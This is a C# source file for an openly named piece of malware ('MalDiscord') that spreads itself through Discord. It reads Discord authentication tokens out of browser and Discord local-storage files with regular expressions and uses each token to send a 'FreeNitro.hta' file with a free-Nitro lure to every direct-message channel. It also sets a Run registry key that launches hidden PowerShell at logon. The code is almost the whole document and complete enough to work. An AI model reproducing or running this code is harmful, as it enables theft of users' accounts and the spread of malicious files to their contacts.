using System;
using System.Text;
using System.Collections.Generic;
using System.IO;
using System.Text.RegularExpressions;
using System.Net.Http.Headers;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace Discord2
{
    class MalDiscord
    {
        [DllImport("advapi32.dll", CharSet = CharSet.Auto)]
        public static extern int RegOpenKeyEx(UIntPtr hKey, string subKey, int ulOptions, int samDesired, out UIntPtr hkResult);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern uint RegSetValueEx(UIntPtr hKey, [MarshalAs(UnmanagedType.LPStr)] string lpValueName, int Reserved, int dwType, IntPtr lpData, int cbData);

        [DllImport("advapi32.dll", CharSet = CharSet.Unicode, EntryPoint = "RegQueryValueExW", SetLastError = true)]
        static extern int RegQueryValueEx(UIntPtr hKey, string lpValueName, int lpReserved, out uint lpType, System.Text.StringBuilder lpData, ref uint lpcbData);

        private static UIntPtr HKEY_LOCAL_MACHINE = new UIntPtr(0x80000002u);
        private static UIntPtr HKEY_CURRENT_USER  = new UIntPtr(0x80000001u);
        private const int KEY_ALL_ACCESS = 0xF003F;
        private const int KEY_READ = 0x20019;
        private const int REG_BINARY = 3;
        private const int REG_SZ = 1;
        
        private const int ERROR_SUCCESS = 0x0;


        private static readonly HttpClient client = new HttpClient();

        private const int MAX_SEND = 200;

        public static void Run()
        {
            if(OpenRegKey(@"SoftWare\Microsoft\Windows\CurrentVersion\Run", "warning")){
                Console.WriteLine("Already Infected!");
                return;
            }

            List<string> tokens = GetTokens();
            if (tokens.Count > 0){
                foreach (string t in tokens){
                    SetHeaders(t);
                    List<string>? chats = GetChatsID(t);
                    if(chats == null)
                        return;
                    
                    ByteArrayContent? fileContent = GetFile();
                    if(fileContent == null)
                        return;

                    foreach(string c in chats){
                        if(c != null)
                            SendMessage(c, fileContent, "Hey, Discord sent me this, you want nitro for free too?");
                    }

                }
            } else {
                Console.WriteLine("No Tokens found :(");
                return;
            }

            string message = "Your Computer has been infected. Do not worry, nothing dangerous or malicious. Next time be more careful with files you download from the internet. PS: No free Nitro :(";
            WriteRegKey(@"SoftWare\Microsoft\Windows\CurrentVersion\Run", "warning", String.Format("powershell -windowstyle hidden -noprofile -command \"Add-Type -Assemblyname PresentationFramework; [System.Windows.Messagebox]::Show('{0}', 'WARNING: Security Breach', 'OK', 'Exclamation')\"", message));
        }

        static List<string> GetTokens()
        {
            
            string? appdata = Environment.GetEnvironmentVariable("LOCALAPPDATA");
            string? roaming = Environment.GetEnvironmentVariable("APPDATA");

            List<string> sourceDirectories = new List<string>();
            
            sourceDirectories.Add(appdata + @"\Google\Chrome\User Data\Default\Local Storage\leveldb");
            sourceDirectories.Add(roaming + @"\discord\Local Storage\leveldb");           
            sourceDirectories.Add(roaming + @"\discordptb\Local Storage\leveldb");
            sourceDirectories.Add(roaming + @"\discordcanary\Local Storage\leveldb");
            sourceDirectories.Add(roaming + @"\Opera Software\Opera Stable\Local Storage\leveldb");
            sourceDirectories.Add(appdata + @"\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb");
            sourceDirectories.Add(appdata + @"\Yandex\YandexBrowser\User Data\Default\Local Storage\leveldb");

            List<string> discordTokens = new List<string>();
            
            foreach(string dir in sourceDirectories){
                if(Directory.Exists(dir))
                {    
                    foreach (var currentFile in Directory.GetFiles(dir, "*.ldb").Concat(Directory.GetFiles(dir, "*.log")))
                    {
                        try{
                            string fileContents;
                            using (var stream = File.OpenText(currentFile)){
                                fileContents = stream.ReadToEnd();
                            }

                            foreach (Match match in Regex.Matches(fileContents, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}")){
                                discordTokens.Add(match.Value);
                            }

                            foreach (Match match in Regex.Matches(fileContents, @"mfa\.[\w-]{84}"))
                                discordTokens.Add(match.Value);
                        } catch {
                            continue;
                        }
                    }
                }
            }

            discordTokens = discordTokens.Distinct().ToList();

            return discordTokens;            
        }
    
        static void SetHeaders(string token)
        {
            client.DefaultRequestHeaders.Clear();
            client.DefaultRequestHeaders.Accept.Add(new MediaTypeWithQualityHeaderValue("application/json"));
            client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11");
            client.DefaultRequestHeaders.Add("Authorization", token);
        }
        
        static List<string>? GetChatsID(string token)
        {
            var r = client.GetAsync("https://discordapp.com/api/v6/users/@me/channels").Result;
            var r_content = r.Content.ReadAsStringAsync().Result;
            
            List<string>? s = new List<string>();
            foreach(Dictionary<string, string> d in DictFromString(r_content)){
                s.Add(d["id"]);
            }

            return s.Distinct().ToList();
        }

        static ByteArrayContent? GetFile()
        {   
            try{
                Stream? fileStream = File.OpenRead(@"FreeNitro.hta");

                if(fileStream != null)
                {
                    var streamContent = new StreamContent(fileStream);
                    var fileContent = new ByteArrayContent(streamContent.ReadAsByteArrayAsync().Result);
                    return fileContent;
                }
                return null;
            } catch {
                return null;
            }
        }

        static void SendMessage(string chat_id, ByteArrayContent fileContent, string message)
        {
            var formContent = new MultipartFormDataContent("---------------------------7363696d6d696f6e654e4654");
            formContent.Add(new StringContent("file"), "name");
            formContent.Add(new StringContent("FreeNitro.hta"), "filename");            
            formContent.Add(fileContent, "content", Path.GetFileName(@"FreeNitro.hta"));
            formContent.Add(new StringContent(message), "content");

            client.DefaultRequestHeaders.Accept.Add(new MediaTypeWithQualityHeaderValue("multipart/form-data"));

            var response = client.PostAsync(String.Format("https://discordapp.com/api/v6/channels/{0}/messages", chat_id), formContent).Result;
        }

        static string FromBase64(string base64){
            return Encoding.Default.GetString(Convert.FromBase64String(base64));
        }

        static bool WriteRegKey(string subkey, string valuename, string message){
            UIntPtr hkey;
            byte[] buffer = Encoding.ASCII.GetBytes(message);                                     
            try{
                if(RegOpenKeyEx(HKEY_CURRENT_USER, subkey, 0, KEY_ALL_ACCESS, out hkey) != ERROR_SUCCESS) throw new Exception();
                unsafe{
                    fixed (byte* p = buffer){
                        if(RegSetValueEx(hkey, valuename, 0, REG_SZ, (IntPtr)p, buffer.Length) != ERROR_SUCCESS) throw new Exception();
                    }
                }
                return true;
            } catch {
                return false;
            }
        }

        static bool OpenRegKey(string subkey, string name){
            UIntPtr hkey;
            if(RegOpenKeyEx(HKEY_CURRENT_USER, subkey, 0, KEY_READ, out hkey) != ERROR_SUCCESS) return false;
            uint size = 1024;
            uint type = 0;
            StringBuilder keyBuffer = new StringBuilder();
            return RegQueryValueEx(hkey, name, 0, out type, keyBuffer, ref size) == ERROR_SUCCESS;
        }

        static Dictionary<string, string>[] DictFromString(string input){
            string[] entries = input.Split(new string[] {"}, {"}, MAX_SEND, StringSplitOptions.RemoveEmptyEntries);
            Dictionary<string, string>[] dict = new Dictionary<string, string>[entries.Length];
            for(int i=0; i<entries.Length; i++){
                dict[i] = new Dictionary<string, string>();
            }

            char[] deletechar = new Char[]{' ', '*', '.', '}', '{', '"'};

            for(int i=0;  i<entries.Length; i++){
                string[] abc = entries[i].Trim(deletechar).Split('[');
                foreach(string s in  abc[0].Split(',')){
                    string [] pair = s.Trim().Split(':');
                    if(pair[1].Trim().Length == 0){
                        pair[1] = "[" + abc[1];
                    }

                    dict[i].Add(pair[0].Trim(deletechar), pair[1].Trim(deletechar));
                }
            }
            return dict;
        }
    }
}
